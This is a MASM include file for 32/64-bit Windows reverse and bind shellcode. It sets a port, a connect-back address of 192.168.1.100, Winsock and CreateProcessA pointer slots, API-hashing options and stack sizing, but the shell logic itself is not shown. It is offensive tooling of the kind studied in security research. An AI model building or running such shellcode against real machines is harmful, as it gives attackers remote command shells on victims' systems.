  ; *********************************************************************
;
;   Copyright (C) 2014 Kevin Devine - @cmpxchg8
;
;   This program is free software: you can redistribute it and/or modify
;   it under the terms of the GNU General Public License as published by
;   the Free Software Foundation, either version 3 of the License, or
;   (at your option) any later version.
;
;   This program is distributed in the hope that it will be useful,
;   but WITHOUT ANY WARRANTY; without even the implied warranty of
;   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;   GNU General Public License for more details.
;
;   You should have received a copy of the GNU General Public License
;   along with this program.  If not, see <http://www.gnu.org/licenses/>.
;
; *********************************************************************
  ; for the 32/64-bit reverse/bind shells
  ifdef USE_BIND
    PORT              equ 80
    TCP_ADDR          equ 0.0.0.0
    TCP_ADDR6         equ ::1
    TCP_MODE          equ Bind
  else
    PORT              equ 80
    TCP_ADDR          equ 192.168.1.100
    TCP_ADDR6         equ fe80::b06f:4929:cf42:7733
    TCP_MODE          equ Reverse
  endif
  
  ifdef USE_IAT
    IMPORT_MODE       equ Import
  else
    IMPORT_MODE       equ Export
  endif
  
  ifdef USE_CRC
    HASH_ALGO         equ CRC32
  else
    HASH_ALGO         equ ADD/ROL
  endif
  
  ifdef USE_X86
    @WordType equ <dword>
    @ApiReg equ <ebx>
  else
    @WordType equ <qword>
    @ApiReg equ <rbx>
  endif
  
  y struc
    @zero                @WordType ?    ; empty
    
    @closesocket         @WordType ?
    
    ifdef USE_BIND
      @accept            @WordType ?
      @listen            @WordType ?
      @bind              @WordType ?
    else
      @connect           @WordType ?
    endif
    
    @WSASocketA          @WordType ?
    @WSAStartup          @WordType ?
    
    @CloseHandle         @WordType ?
    @WaitForSingleObject @WordType ?
    @CreateProcessA      @WordType ?
    @LoadLibraryA        @WordType ?
  y ends
  
  x struc
    union
      @sin4 SOCKADDR_IN <>
      @sin6 SOCKADDR_IN6 <>
      @cmd BYTE 8 dup (?)
      @api BYTE 32 dup (?)
    ends
    
    union
      @pi  PROCESS_INFORMATION <>  ; CreateProcessA
      @si  STARTUPINFO <>          ; CreateProcessA
    ends
  x ends
  
  DS_STK_SIZE equ sizeof (x)
  CS_STK_SIZE equ sizeof (y)
  
  ifdef USE_X86
    GBL_STK_SIZE equ ((DS_STK_SIZE + CS_STK_SIZE) and -4) + 4
  else
    GBL_STK_SIZE equ (((DS_STK_SIZE + CS_STK_SIZE) and -16) + 16) - 8
  endif
  
  callx macro api:req
    call  @WordType ptr [@ApiReg - y.api]
  endm
  